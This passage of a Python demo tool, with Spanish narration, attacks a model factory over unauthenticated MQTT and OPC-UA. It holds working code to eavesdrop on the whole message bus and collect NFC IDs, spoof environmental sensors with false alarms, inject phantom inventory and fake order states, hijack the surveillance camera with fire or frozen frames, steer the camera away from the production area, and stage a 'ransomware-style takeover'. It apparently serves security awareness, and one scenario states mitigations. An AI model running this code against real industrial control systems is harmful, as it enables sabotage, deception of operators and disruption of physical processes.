            "gtyp_HBW.x_HBW_PickUp_Ready",
            "gtyp_HBW.x_HBW_Container_Available",
            "gtyp_SLD.i_Counter_Actual",
            "gtyp_SLD.i_CounterValue_Red",
            "gtyp_SLD.i_CounterValue_White",
            "gtyp_SLD.i_CounterValue_Blue",
            "gtyp_Setup.x_Fill_Rack_HBW",
            "gtyp_Setup.x_Clean_Rack_HBW",
            "gtyp_Setup.x_Park_Position",
            "gtyp_Setup.x_AcknowledgeButton",
            "gtyp_VGR.horizontal_Axis",
            "gtyp_VGR.vertical_Axis",
            "gtyp_VGR.rotate_Axis",
            "gtyp_HBW.Horizontal_Axis",
            "gtyp_HBW.Vertical_Axis",
            "gtyp_SSC.Horizontal_Axis",
            "gtyp_SSC.Vertical_Axis",
            "gtyp_VGR.Workpiece",
            "gtyp_HBW.Workpiece",
            "gtyp_SSC.Workpiece",
            "gtyp_MPO.Workpiece",
            "gtyp_SLD.Workpiece",
        ]

        nodes = []
        for var in monitored:
            nid = make_nodeid(ns, var)
            try:
                node = client.get_node(nid)
                await node.read_value()
                nodes.append(node)
            except Exception:
                pass

        if not nodes:
            err("no monitored nodes available")
            return

        ok(f"subscribing to {len(nodes)} variables · {duration_s}s window")
        print(f"  {C.MUTE}─ legend: {C.BLUE}◦{C.MUTE} initial value   {C.ORANGE}▸{C.MUTE} change detected{C.RESET}")
        print()

        handler = _MonitorHandler()
        subscription = await client.create_subscription(500, handler)
        await subscription.subscribe_data_change(nodes)

        try:
            await asyncio.sleep(duration_s)
        finally:
            try:
                await subscription.delete()
            except Exception:
                pass

        print()
        ok(f"{C.GREEN} MONITOR STOPPED · captured {handler.event_count} events "
           f"from {len(handler.last_values)} distinct variables {C.RESET}")
        info("if the PLC had any auditing, this would show 1 OPC-UA session. That's it.")
        info("no record of WHAT was read. no record of how many variables. no trace.")

    finally:
        await client.disconnect()


# ════════════════════════════════════════════════════════════════════════
# MQTT + Orchestrator
# ════════════════════════════════════════════════════════════════════════
class ShowroomDemo:
    def __init__(self):
        cid = f"demo-{random.randint(1000, 9999)}"
        if hasattr(mqtt, "CallbackAPIVersion"):
            self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, cid)
        else:
            self.client = mqtt.Client(cid)
        if USER:
            self.client.username_pw_set(USER, PASS)
        self.client.connect(BROKER, PORT, keepalive=60)
        self.client.loop_start()
        time.sleep(0.3)

        self.fake_sensor_running = False
        self.sensor_thread = None

        self.cam_hijack_running = False
        self.cam_hijack_mode = None
        self.cam_thread = None

        # multiple concurrent state-injection loops, keyed by label.
        # each entry: {"running": bool, "payloads": [...], "thread": Thread}
        self.state_injections = {}
        self.state_injections_lock = threading.Lock()

        self.session_start = time.time()
        self.attacks_launched = 0
        self.topics_compromised = set()
        self.msgs_published = 0
        self.timeline = []

        _original_publish = self.client.publish
        def _tracked_publish(topic, payload=None, *args, **kwargs):
            self.msgs_published += 1
            self.topics_compromised.add(topic)
            return _original_publish(topic, payload, *args, **kwargs)
        self.client.publish = _tracked_publish

        self.cid = cid
        if sys.stdout.isatty():
            self._target_acquisition()
        else:
            ok(f"{C.BOLD}Connected{C.RESET} to {C.BLUE}{BROKER}:{PORT}{C.RESET} "
               f"{C.DIM_FG}as{C.RESET} {C.BLUE_D}{cid}{C.RESET}")

    def _target_acquisition(self):
        print()
        print(f"  {C.DIM_FG}[{clock()}]{C.RESET} "
              f"{C.BLUE}▸{C.RESET} establishing MQTT channel to "
              f"{C.BLUE_L}{BROKER}:{PORT}{C.RESET}…")
        time.sleep(0.6)
        print(f"  {C.DIM_FG}[{clock()}]{C.RESET} "
              f"{C.GREEN}✓{C.RESET} CONNACK received "
              f"{C.DIM_FG}· no authentication required{C.RESET}")
        time.sleep(0.4)
        print(f"  {C.DIM_FG}[{clock()}]{C.RESET} "
              f"{C.DIM_FG}session_id:{C.RESET} "
              f"{C.BLUE_D}{self.cid}{C.RESET} "
              f"{C.DIM_FG}(chosen by attacker — broker accepts any ID){C.RESET}")
        time.sleep(0.4)

        print()
        print(f"  {C.ORANGE}▸ target fingerprinting{C.RESET}  "
              f"{C.DIM_FG}· listening to $SYS for 2s…{C.RESET}")
        time.sleep(0.3)

        components = [
            ("HBW",  "High-Bay Warehouse",   "3x3 rack · NFC-tagged workpieces"),
            ("VGR",  "Vacuum Gripper Robot", "pan/tilt/grip actuator"),
            ("MPO",  "Multi-Processing Oven","heating + conveyor station"),
            ("SLD",  "Sorting Line",         "color-based routing"),
            ("DPS",  "Delivery/Pickup",      "NFC reader · TXT 4.0 host"),
            ("SSC",  "Surveillance Camera",  "PTU servo · MJPEG stream"),
        ]
        for code, name, detail in components:
            time.sleep(0.35)
            print(f"    {C.GREEN}✓{C.RESET} "
                  f"{C.FG}{C.BOLD}{code:<4}{C.RESET} "
                  f"{C.DIM_FG}{name:<22}{C.RESET} "
                  f"{C.MUTE}·{C.RESET} {C.DIM_FG}{detail}{C.RESET}")

        time.sleep(0.4)
        print()
        print(f"  {C.RED_B}▸ TARGET ACQUIRED{C.RESET}  "
              f"{C.DIM_FG}· 6 subsystems mapped · 0 defenses detected{C.RESET}")
        time.sleep(0.6)
        bell()
        print()
        try:
            input(f"  {C.DIM_FG}press enter to open attack console…{C.RESET}")
        except EOFError:
            pass

    # ─── MQTT: orders ─────────────────────────────────────────────────
    def order(self, color):
        if color not in COLORS:
            err(f"invalid color {color}")
            return
        msg = {"ts": ts(), "type": color}
        cmd_line(mosq_pub("f/o/order", msg))
        self.client.publish("f/o/order", json.dumps(msg), qos=0)
        mqtt_line("f/o/order", f"type={color}")
        narration(f"fábrica inicia ciclo completo para pieza {color}")

    def _ptu_move(self, cmd, degree=15):
        msg = {"cmd": cmd, "degree": degree, "ts": ts()}
        self.client.publish("o/ptu", json.dumps(msg), qos=0)

    def ptu_dance(self):
        cmd_line(f"mosquitto_pub -h {BROKER} -t o/ptu -m '{{cmd, degree, ts}}'")
        mqtt_line("o/ptu", "3-phase attack: recon → blind → return")

        self._ptu_move("home", 0)
        time.sleep(0.8)

        phase(1, "barrido de reconocimiento lateral del área")
        recon_sequence = [
            ("relmove_right", 30),
            ("relmove_left",  60),
            ("relmove_right", 60),
            ("relmove_left",  60),
            ("relmove_right", 60),
            ("relmove_left",  30),
        ]
        for cmd, deg in recon_sequence:
            self._ptu_move(cmd, deg)
            time.sleep(1.6)

        phase(2, "cámara apunta al techo — zona productiva fuera de cuadro")
        self._ptu_move("relmove_up", 30)
        time.sleep(0.7)
        self._ptu_move("relmove_up", 30)
        for i in range(10, 0, -1):
            sys.stdout.write(f"\r  {C.ORANGE}·{C.RESET} "
                             f"{C.DIM_FG}cámara ciega — atacante actuando…"
                             f" {i:2d}s  {C.RESET}")
            sys.stdout.flush()
            time.sleep(1)
        sys.stdout.write("\r" + " " * 60 + "\r")

        phase(3, "cámara vuelve al centro — ataque invisible")
        self._ptu_move("home", 0)
        time.sleep(1.8)

        ok("ptu dance complete")

    # ─── MQTT: sensor spoofing ────────────────────────────────────────
    def _fake_sensor_loop(self, values):
        while self.fake_sensor_running:
            msg = {"ts": ts(), **values}
            self.client.publish("i/bme680", json.dumps(msg), qos=0)
            time.sleep(0.8)

    def _start_sensor_spoof(self, values, label, narration_text):
        if self.fake_sensor_running:
            self.fake_sensor_running = False
            if self.sensor_thread:
                self.sensor_thread.join(timeout=1.2)
        cmd_line(f"while true; do "
                 f"{mosq_pub('i/bme680', {'ts': '...', **values})}; "
                 f"sleep 0.8; done")
        self.fake_sensor_running = True
        self.sensor_thread = threading.Thread(
            target=self._fake_sensor_loop, args=(values,), daemon=True)
        self.sensor_thread.start()
        mqtt_line("i/bme680", label + " (loop sostenido)")
        narration(narration_text)

    def start_fake_sensor(self, t=22.5, h=45.0, p=1013.0):
        values = {"t": t, "h": h, "p": p, "iaq": 50, "aq": 1}
        self._start_sensor_spoof(
            values,
            f"t={t}°C h={h}% p={p}hPa",
            "sensor ambiental miente constantemente valores nominales",
        )

    def stop_fake_sensor(self):
        if not self.fake_sensor_running:
            info("no spoof running")
            return
        self.fake_sensor_running = False
        ok("sensor spoof stopped")

    def dramatic_sensor(self):
        values = {"t": 87.3, "h": 8.0, "p": 870, "iaq": 480, "aq": 5}
        self._start_sensor_spoof(
            values,
            "t=87.3°C iaq=480 (alarma térmica)",
            "HMI marca condición crítica de forma sostenida — semáforo rojo",
        )

    # ─── MQTT: state injection ────────────────────────────────────────
    def _state_inject_loop(self, label):
        # each loop is bound to its own label; reads its own flag from the dict
        while True:
            entry = self.state_injections.get(label)
            if not entry or not entry.get("running"):
                return
            for topic, payload in entry["payloads"]:
                if isinstance(payload, dict) and "ts" in payload:
                    payload["ts"] = ts()
                self.client.publish(topic, json.dumps(payload), qos=0)
            time.sleep(0.5)

    def _start_state_inject(self, label, payloads):
        # if a loop with the same label exists, replace it (no effect on others)
        with self.state_injections_lock:
            existing = self.state_injections.get(label)
            if existing and existing.get("running"):
                existing["running"] = False
                old_thread = existing.get("thread")
            else:
                old_thread = None

        if old_thread:
            old_thread.join(timeout=1.0)

        with self.state_injections_lock:
            entry = {"running": True, "payloads": payloads, "thread": None}
            self.state_injections[label] = entry
            t = threading.Thread(target=self._state_inject_loop,
                                 args=(label,), daemon=True)
            entry["thread"] = t
        t.start()

    def stop_state_inject(self, label=None):
        # label=None → stop all active injections; otherwise only the named one
        with self.state_injections_lock:
            if label is None:
                targets = [(lbl, e) for lbl, e in self.state_injections.items()
                           if e.get("running")]
            else:
                e = self.state_injections.get(label)
                targets = [(label, e)] if e and e.get("running") else []

        if not targets:
            info("no state injection running")
            return

        for lbl, entry in targets:
            entry["running"] = False

        for lbl, entry in targets:
            t = entry.get("thread")
            if t:
                t.join(timeout=1.0)
            with self.state_injections_lock:
                self.state_injections.pop(lbl, None)
            ok(f"{lbl} stopped · PLC regains control of state")

    def _active_injections(self):
        with self.state_injections_lock:
            return [lbl for lbl, e in self.state_injections.items()
                    if e.get("running")]

    def chaos_busy(self):
        payloads = []
        for station in ("hbw", "vgr", "mpo", "sld"):
            msg = {
                "ts": ts(), "station": station, "code": 2,
                "description": "", "active": True,
                "target": "mpo" if station == "vgr" else "",
            }
            payloads.append((f"f/i/state/{station}", msg))

        cmd_line(f"while true; do for st in hbw vgr mpo sld; do "
                 f"mosquitto_pub -h {BROKER} -t f/i/state/$st -m '{{...}}'; "
                 f"done; sleep 0.5; done")
        mqtt_line("f/i/state/*", "code=2 active=true  (4 estaciones · loop sostenido)")
        narration("toda la fábrica parece en actividad sin orden real")
        narration("loop continuo · publicamos más rápido que el PLC")
        self._start_state_inject("chaos busy", payloads)
        bell()

    def fake_shipped(self):
        msg_state = {"ts": ts(), "station": "dso", "code": 0,
                     "description": "", "active": True, "target": ""}
        msg_order = {"ts": ts(), "state": "SHIPPED", "type": "RED"}
        cmd_line(f"while true; do "
                 f"mosquitto_pub -h {BROKER} -t f/i/state/dso -m '{{...}}' && "
                 f"mosquitto_pub -h {BROKER} -t f/i/order -m '{{...SHIPPED...}}'; "
                 f"sleep 0.5; done")
        mqtt_line("f/i/state/dso", "code=0 active=true  (loop)")
        mqtt_line("f/i/order",     "state=SHIPPED type=RED  (loop)")
        narration("pieza RED 'lista' en el DPS — no existe físicamente")
        self._start_state_inject("fake shipped", [
            ("f/i/state/dso", msg_state),
            ("f/i/order", msg_order),
        ])
        bell()

    def ghost_stock(self):
        fake_stock = {
            "ts": ts(),
            "stockItems": [
                {"workpiece": {"id": f"PHANTOM{i+1}", "state": "RAW",
                               "type": ["RED", "BLUE", "WHITE"][i % 3]},
                 "location": f"{c}{r}"}
                for i, (c, r) in enumerate(
                    [(c, r) for c in "ABC" for r in "123"]
                )
            ],
        }
        cmd_line(f"while true; do "
                 f"mosquitto_pub -h {BROKER} -t f/i/stock -m "
                 "'{\"stockItems\":[<9 phantom pieces>]}'; sleep 0.5; done")
        mqtt_line("f/i/stock", "9 piezas fantasma (id=PHANTOM*)  (loop)")
        narration("warehouse parece lleno con piezas inexistentes")
        self._start_state_inject("ghost stock", [("f/i/stock", fake_stock)])
        bell()

    def reset_state(self):
        if self._active_injections():
            self.stop_state_inject()

        cmd_line(f"for st in hbw vgr mpo sld dsi dso; do "
                 f"mosquitto_pub -h {BROKER} -t f/i/state/$st -m '{{code:1,...}}'; done")
        for station in ("hbw", "vgr", "mpo", "sld", "dsi", "dso"):
            msg = {
                "ts": ts(), "station": station, "code": 1,
                "description": "", "active": False, "target": "",
            }
            self.client.publish(f"f/i/state/{station}", json.dumps(msg), qos=0)
        self.client.publish("f/i/order", json.dumps({
            "ts": ts(), "state": "WAITING_FOR_ORDER", "type": "",
        }), qos=0)
        mqtt_line("f/i/state/*", "code=1 active=false (todas)")
        mqtt_line("f/i/order", "state=WAITING_FOR_ORDER")
        narration("reset visual — la fábrica real re-publicará en segundos")

    # ─── MQTT: camera hijack ──────────────────────────────────────────
    def _load_image_as_data_uri(self, path):
        try:
            import cv2
        except ImportError:
            err("opencv-python no está instalado")
            info("pip install opencv-python-headless")
            return None
        if not Path(path).exists():
            err(f"no existe: {path}")
            return None
        img = cv2.imread(str(path), cv2.IMREAD_COLOR)
        if img is None:
            err(f"no se pudo leer: {path}")
            return None
        img = cv2.resize(img, (CAM_WIDTH, CAM_HEIGHT),
                         interpolation=cv2.INTER_AREA)
        ok_enc, encoded = cv2.imencode(
            ".jpg", img, [int(cv2.IMWRITE_JPEG_QUALITY), CAM_JPEG_QUALITY])
        if not ok_enc:
            err(f"falló encode JPG: {path}")
            return None
        b64 = base64.b64encode(encoded.tobytes()).decode("ascii")
        return f"data:image/jpeg;base64,{b64}"

    def _load_fire_frames(self):
        frames = []
        for path in FIRE_FRAMES:
            uri = self._load_image_as_data_uri(path)
            if uri is None:
                info("poné las imágenes en ./image/fire_1.png, fire_2.png, fire_3.png")
                return None
            frames.append(uri)
        return frames

    def _cam_hijack_loop(self, frames):
        idx = 0
        while self.cam_hijack_running:
            payload = {"ts": ts(), "data": frames[idx]}
            self.client.publish("i/cam", json.dumps(payload), qos=1)
            time.sleep(CAM_FRAME_DELAY)
            idx = (idx + 1) % len(frames)

    def _start_cam_hijack(self, frames, mode_label, narration_text, cmd_hint):
        if self.cam_hijack_running:
            self.cam_hijack_running = False
            if self.cam_thread:
                self.cam_thread.join(timeout=1.2)
        cmd_line(cmd_hint)
        self.cam_hijack_running = True
        self.cam_hijack_mode = mode_label
        self.cam_thread = threading.Thread(
            target=self._cam_hijack_loop, args=(frames,), daemon=True)
        self.cam_thread.start()
        fps = int(1 / CAM_FRAME_DELAY)
        mqtt_line("i/cam", f"{len(frames)} frame(s) × {fps} fps  ({mode_label})")
        narration(narration_text)
        warn("press 's' to stop the hijack")

    def start_cam_fire(self, announce=True):
        if self.cam_hijack_running and self.cam_hijack_mode == "fire loop":
            info("fire hijack already running")
            return
        info("loading fire frames…")
        frames = self._load_fire_frames()
        if frames is None:
            return
        if announce:
            countdown(3, "CAMERA HIJACK")
        self._start_cam_hijack(
            frames,
            mode_label="fire loop",
            narration_text="operador ve su cámara SSC con fuego dentro de la fábrica",
            cmd_hint=(f"while true; do "
                      f"mosquitto_pub -h {BROKER} -t i/cam "
                      f"-m '{{\"data\":\"<fire.jpg base64>\"}}'; "
                      f"sleep {CAM_FRAME_DELAY}; done"),
        )
        bell()

    def start_cam_freeze(self):
        if self.cam_hijack_running and self.cam_hijack_mode == "freeze frame":
            info("freeze hijack already running")
            return
        path = FREEZE_FRAME if FREEZE_FRAME.exists() else FIRE_FRAMES[0]
        if not path.exists():
            err("no existe ninguna imagen para freeze (ni freeze.png ni fire_1.png)")
            info("poné una imagen en ./image/freeze.png")
            return
        info(f"loading freeze frame: {path.name}…")
        uri = self._load_image_as_data_uri(path)
        if uri is None:
            return
        self._start_cam_hijack(
            [uri],
            mode_label="freeze frame",
            narration_text="operador ve la cámara 'normal' pero congelada — oculta actividad real",
            cmd_hint=(f"while true; do "
                      f"mosquitto_pub -h {BROKER} -t i/cam "
                      f"-m '{{\"data\":\"<{path.name} base64>\"}}'; "
                      f"sleep {CAM_FRAME_DELAY}; done"),
        )

    def stop_cam_hijack(self):
        if not self.cam_hijack_running:
            info("no hijack running")
            return
        self.cam_hijack_running = False
        self.cam_hijack_mode = None
        ok("camera hijack stopped")

    # ─── Cleanup ──────────────────────────────────────────────────────
    def stop_all_background(self):
        stopped_any = False
        if self.cam_hijack_running:
            self.stop_cam_hijack()
            stopped_any = True
        if self.fake_sensor_running:
            self.stop_fake_sensor()
            stopped_any = True
        if self._active_injections():
            self.stop_state_inject()
            stopped_any = True
        if not stopped_any:
            info("no background attacks running")

    # ─── Live eavesdropping ───────────────────────────────────────────
    def live_eavesdrop(self, seconds=12):
        cmd_line(f"mosquitto_sub -h {BROKER} -t '#' -v   # no auth, no TLS, plaintext")
        print(f"  {C.DIM_FG}{'─' * 66}{C.RESET}")
        print(f"  {C.ORANGE}⚠{C.RESET}  {C.FG}el broker acepta conexión anónima sin credenciales{C.RESET}")
        print(f"  {C.ORANGE}⚠{C.RESET}  {C.FG}todos los payloads viajan en texto plano (no TLS){C.RESET}")
        print(f"  {C.ORANGE}⚠{C.RESET}  {C.FG}cualquiera en la LAN puede leer todo el tráfico{C.RESET}")
        print(f"  {C.DIM_FG}{'─' * 66}{C.RESET}")
        time.sleep(1.8)

        sensitive_keys = ("type", "state", "code", "description", "target",
                          "station", "workpiece", "id", "nfc", "t", "iaq",
                          "pan", "tilt")

        def _highlight(payload_str):
            if len(payload_str) > 90:
                payload_str = payload_str[:89] + "…"
            for k in sensitive_keys:
                payload_str = re.sub(
                    rf'("{k}"\s*:\s*)("[^"]*"|[^,}}\]]+)',
                    lambda m: f'{C.DIM_FG}{m.group(1)}{C.RESET}'
                              f'{C.YELLOW}{m.group(2)}{C.RESET}{C.DIM_FG}',
                    payload_str
                )
            return f"{C.DIM_FG}{payload_str}{C.RESET}"

        received = []
        count = [0]

        def _on_msg(c, u, m):
            count[0] += 1
            topic = m.topic
            try:
                payload = m.payload.decode("utf-8", errors="replace")
            except Exception:
                payload = "<binary>"
            received.append((topic, payload))
            ts_str = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            print(f"  {C.FG}{ts_str}{C.RESET}  "
                  f"{C.BLUE}{topic:<24s}{C.RESET}  "
                  f"{_highlight(payload)}")

        self.client.message_callback_add("#", _on_msg)
        self.client.subscribe("#", qos=0)

        info(f"sniffing for {seconds}s (Ctrl+C to stop early)…")
        print()
        try:
            for remaining in range(seconds, 0, -1):
                time.sleep(1)
        except KeyboardInterrupt:
            print()
            warn("interrupted by user")

        self.client.unsubscribe("#")
        self.client.message_callback_remove("#")

        print()
        print(f"  {C.DIM_FG}{'─' * 66}{C.RESET}")
        ok(f"captured {C.BOLD}{len(received)}{C.RESET} messages in {seconds}s")

        topics = {}
        nfc_ids = set()
        orders_seen = set()
        for topic, payload in received:
            topics[topic] = topics.get(topic, 0) + 1
            for m in re.finditer(r'"id"\s*:\s*"([^"]+)"', payload):
                nfc_ids.add(m.group(1))
            for m in re.finditer(r'"type"\s*:\s*"(RED|BLUE|WHITE)"', payload):
                orders_seen.add(m.group(1))

        print(f"  {C.DIM_FG}·{C.RESET} {C.FG}{len(topics)}{C.RESET} "
              f"{C.DIM_FG}topics únicos{C.RESET}")
        if nfc_ids:
            print(f"  {C.DIM_FG}·{C.RESET} {C.FG}{len(nfc_ids)}{C.RESET} "
                  f"{C.DIM_FG}NFC IDs detectados:{C.RESET} "
                  f"{C.YELLOW}{', '.join(list(nfc_ids)[:5])}{C.RESET}"
                  f"{C.DIM_FG}{'…' if len(nfc_ids) > 5 else ''}{C.RESET}")
        if orders_seen:
            print(f"  {C.DIM_FG}·{C.RESET} {C.FG}tipos de orden observados:{C.RESET} "
                  f"{C.YELLOW}{', '.join(sorted(orders_seen))}{C.RESET}")
        narration("todo esto lo obtuve sin credenciales, sin TLS, "
                  "sin levantar ninguna alerta en la fábrica")

    # ─── Scenarios ────────────────────────────────────────────────────
    def _scenario_step(self, step_num, total, title, pause=2.0):
        print(f"\n  {C.ORANGE}{C.BOLD}▸ step {step_num}/{total}{C.RESET}  "
              f"{C.FG}{title}{C.RESET}")
        print(f"  {C.MUTE}{'─' * 46}{C.RESET}")
        time.sleep(pause)

    def _scenario_intro(self, name, description, steps_count):
        w = 70
        print()
        print()
        print(f"  {C.RED_B}╔{'═' * (w - 2)}╗{C.RESET}")
        title_line = f"⚠  SCENARIO: {name}  ⚠"
        pad_title = (w - 2 - len(title_line)) // 2
        print(f"  {C.RED_B}║{C.RESET}{' ' * pad_title}"
              f"{C.RED_B}{C.BOLD}{title_line}{C.RESET}"
              f"{' ' * (w - 2 - pad_title - len(title_line))}"
              f"{C.RED_B}║{C.RESET}")
        print(f"  {C.RED_B}║{C.RESET}{' ' * (w - 2)}{C.RED_B}║{C.RESET}")
        wrapped = textwrap.wrap(description, width=w - 8)
        for line in wrapped:
            pad_line = (w - 2 - len(line)) // 2
            print(f"  {C.RED_B}║{C.RESET}{' ' * pad_line}"
                  f"{C.DIM_FG}{line}{C.RESET}"
                  f"{' ' * (w - 2 - pad_line - len(line))}"
                  f"{C.RED_B}║{C.RESET}")
        print(f"  {C.RED_B}║{C.RESET}{' ' * (w - 2)}{C.RED_B}║{C.RESET}")
        meta = f"{steps_count} steps · ~{steps_count * 3}s execution"
        pad_meta = (w - 2 - len(meta)) // 2
        print(f"  {C.RED_B}║{C.RESET}{' ' * pad_meta}"
              f"{C.ORANGE}{meta}{C.RESET}"
              f"{' ' * (w - 2 - pad_meta - len(meta))}"
              f"{C.RED_B}║{C.RESET}")
        print(f"  {C.RED_B}╚{'═' * (w - 2)}╝{C.RESET}")
        bell()
        time.sleep(2.0)

    def _scenario_outro(self, takeaway):
        w = 70
        print()
        print(f"  {C.GREEN}{C.BOLD}{'█' * 3} SCENARIO COMPLETE {'█' * 3}{C.RESET}")
        print()
        print(f"  {C.GREEN}┌─ takeaway {'─' * (w - 14)}┐{C.RESET}")
        wrapped = textwrap.wrap(takeaway, width=w - 6)
        for line in wrapped:
            print(f"  {C.GREEN}│{C.RESET} {C.FG}{line}{C.RESET}"
                  f"{' ' * (w - 4 - len(line))}{C.GREEN}│{C.RESET}")
        print(f"  {C.GREEN}└{'─' * (w - 2)}┘{C.RESET}")
        print()

    def scenario_eavesdrop(self):
        self._scenario_intro(
            "EAVESDROPPING — sniff del bus MQTT",
            "demostrar que cualquiera en la LAN puede leer el tráfico "
            "completo de la fábrica sin credenciales ni encriptación",
            steps_count=3,
        )
        self._scenario_step(1, 3, "conexión anónima al broker (sin usuario ni contraseña)")
        info("el broker acepta connect con client-id arbitrario")
        info("no hace falta interactuar con el PLC, solo alcanzar el puerto 1883")
        time.sleep(1.5)

        self._scenario_step(2, 3, "suscripción al wildcard '#' (todos los topics)")
        info("una sola suscripción '#' captura todo el bus")
        info("el broker no filtra por origen ni valida permisos por topic")
        time.sleep(1.5)

        self._scenario_step(3, 3, "captura en vivo con highlights de datos sensibles")
        self.live_eavesdrop(seconds=10)
        self._scenario_outro(
            "exposición total: NFC IDs, estado productivo, órdenes, sensores — "
            "todo visible sin autenticación. Mitigación: MQTT sobre TLS (puerto 8883) "
            "con usuario/contraseña y ACLs por topic")

    def scenario_ransomware(self):
        self._scenario_intro(
            "RANSOMWARE-STYLE TAKEOVER",
            "el atacante demuestra control total sobre la planta "
            "para forzar un pago de rescate",
            steps_count=5,
        )
        steps = [
            ("todas las estaciones ocupadas (la fábrica no responde)", self.chaos_busy),
            ("alarma térmica sostenida (semáforo rojo)",                self.dramatic_sensor),
            ("inventario alterado (los números del ERP mienten)",       self.ghost_stock),
            ("PTU dance · cámara desviada del área productiva",         self.ptu_dance),
            ("fuego en la cámara (golpe visual final)",
             lambda: self.start_cam_fire(announce=False)),
        ]
        total = len(steps)
        for idx, (title, _) in enumerate(steps, start=1):
            print(f"\n  {C.ORANGE}{C.BOLD}▸ step {idx}/{total}{C.RESET}  "
                  f"{C.FG}{title}{C.RESET}")
            print(f"  {C.MUTE}{'─' * 46}{C.RESET}")
        print(f"\n  {C.RED_B}{C.BOLD}⟫ ejecutando los {total} pasos en paralelo…{C.RESET}\n")
        threads = [threading.Thread(target=action, daemon=True)
                   for _, action in steps]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        self._scenario_outro(
            "en menos de 20 segundos, el atacante ha tomado la representación "
            "digital completa de la fábrica sin tocar el hardware")

    # ─── OPC-UA wrappers ──────────────────────────────────────────────
    def _require_asyncua(self):
        if not _HAS_ASYNCUA:
            err("asyncua no está instalado")
            info("pip install asyncua")
            return False
        return True

    def opcua_discover(self):
        if not self._require_asyncua():
            return
        asyncio.run(cmd_discover())

    def opcua_browse(self):
        if not self._require_asyncua():
            return
        asyncio.run(cmd_browse())

    def opcua_read(self):
        if not self._require_asyncua():
            return
        asyncio.run(cmd_read())

    def opcua_inspect(self):
        if not self._require_asyncua():
            return
        try:
            target = input(f"  {C.BLUE}variable ▸{C.RESET} ").strip()
        except EOFError:
            return
        if not target:
            err("no target specified (ej: gtyp_HBW.Rack_Workpiece)")
            return
        asyncio.run(cmd_inspect(target))

    def opcua_ghost_real(self):
        if not self._require_asyncua():
            return
        asyncio.run(cmd_ghost("real"))

    def opcua_ghost_snapshot(self):
        if not self._require_asyncua():
            return
        asyncio.run(cmd_ghost("snapshot"))

    def opcua_ghost_restore(self):
        if not self._require_asyncua():
            return
        asyncio.run(cmd_ghost("restore"))

    def opcua_trigger_park(self):
        if not self._require_asyncua():
            return
        asyncio.run(cmd_alert("park"))

    def opcua_monitor(self):
        if not self._require_asyncua():
            return
        try:
            raw = input(f"  {C.BLUE}duration seconds [60] ▸{C.RESET} ").strip()
        except EOFError:
            return
        try:
            secs = int(raw) if raw else 60
        except ValueError:
            err(f"invalid duration: '{raw}'")
            return
        asyncio.run(cmd_monitor(secs))

    # ─── Menu ─────────────────────────────────────────────────────────
    def menu(self):
        actions = [
            ("MQTT · L1", "single commands"),
            ("1", "Order RED",                        lambda: self.order("RED")),
            ("2", "Order BLUE",                       lambda: self.order("BLUE")),
            ("3", "Order WHITE",                      lambda: self.order("WHITE")),
            ("4", "PTU dance · camera misdirection",  self.ptu_dance),

            ("MQTT · L3", "stealth sensor spoofing"),
            ("7", "Sensor spoof · 22.5 °C nominal",   self.start_fake_sensor),
            ("9", "Sensor ALARM · 87 °C critical",    self.dramatic_sensor),

            ("MQTT · L4", "state injection · real topics"),
            ("c", "Chaos busy · all stations",        self.chaos_busy),
            ("g", "Ghost stock · 9 phantom pieces",   self.ghost_stock),
            ("R", "Reset state (temporary HUD clean)", self.reset_state),

            ("MQTT · L5", "camera hijack · visual impact"),
            ("v", "Fire loop · burning workshop feed", self.start_cam_fire),
            ("V", "Freeze frame · invisible blindfold", self.start_cam_freeze),

            ("MQTT · L6", "combined scenarios"),
            ("E", "Eavesdrop · passive sniffing",     self.scenario_eavesdrop),
            ("T", "Takeover · ransomware-style control", self.scenario_ransomware),

            ("OPC-UA", "direct PLC attack · no auth, no TLS"),
            ("d", "discover · full node-tree walk",   self.opcua_discover),
            ("b", "browse · namespace + targeted reads", self.opcua_browse),
            ("n", "read · plant snapshot",            self.opcua_read),
            ("i", "inspect VAR · examine type + schema", self.opcua_inspect),
            ("G", "ghost real · 9 phantom pieces · overwrite Rack_Workpiece",
                                                      self.opcua_ghost_real),
            ("s", "ghost snapshot · save inventory before attack",
                                                      self.opcua_ghost_snapshot),
            ("Z", "ghost restore · rewrite PLC from snapshot",
                                                      self.opcua_ghost_restore),
            ("P", "trigger park · send all stations to parking",
                                                      self.opcua_trigger_park),
            ("M", "monitor [SEC] · real-time subscription to every variable change",
                                                      self.opcua_monitor),

            ("CONTROL", "session control"),
            ("X", "Stop all background attacks",      self.stop_all_background),
            ("q", "Quit · guaranteed clean exit",     None),
        ]

        while True:
            self._draw_menu(actions)
            try:
                choice = input(f"\n  {C.BLUE}{C.BOLD}▸{C.RESET} ").strip()
            except EOFError:
                break
            if choice == "q":
                break
            fn = next((a for a in actions
                       if len(a) == 3 and a[0] == choice), None)
            if fn:
                key, label, func = fn
                t_rel = int(time.time() - self.session_start)
                utility_keys = {"X", "R", "d", "b", "n", "i", "s", "M"}
                is_attack = key not in utility_keys
                if is_attack:
                    self.attacks_launched += 1
                self.timeline.append((t_rel, key, label, is_attack))
                print()
                try:
                    func()
                except Exception as e:
                    err(f"{type(e).__name__}: {e}")
                self._pause_and_cleanup()
            else:
                err(f"unknown command: {choice}")
                time.sleep(0.8)

        self._shutdown()

    def _pause_and_cleanup(self):
        has_cam = self.cam_hijack_running
        has_spoof = self.fake_sensor_running
        active_labels = self._active_injections()
        has_inject = bool(active_labels)

        if has_cam or has_spoof or has_inject:
            running = []
            if has_cam:
                running.append(f"{C.RED}camera hijack{C.RESET}")
            if has_spoof:
                running.append(f"{C.RED}sensor spoof{C.RESET}")
            for lbl in active_labels:
                running.append(f"{C.RED}{lbl}{C.RESET}")
            lst = " + ".join(running)
            prompt = (f"\n  {C.ORANGE}▸{C.RESET} {lst} {C.DIM_FG}still running"
                      f" · press enter to stop & continue…{C.RESET}")
            try:
                input(prompt)
            except EOFError:
                pass
            if has_cam:
                self.stop_cam_hijack()
            if has_spoof:
                self.stop_fake_sensor()
            if has_inject:
                self.stop_state_inject()
        else:
            try:
                input(f"\n  {C.DIM_FG}press enter to continue…{C.RESET}")
            except EOFError:
                pass

    def _draw_menu(self, actions):
        os.system("clear" if os.name != "nt" else "cls")
        banner()

        if self.cam_hijack_running:
            if self.cam_hijack_mode == "fire loop":
                cam_state = f"{C.RED}{C.BOLD}FIRE{C.RESET}"
            elif self.cam_hijack_mode == "freeze frame":
                cam_state = f"{C.ORANGE}{C.BOLD}FROZEN{C.RESET}"
            else:
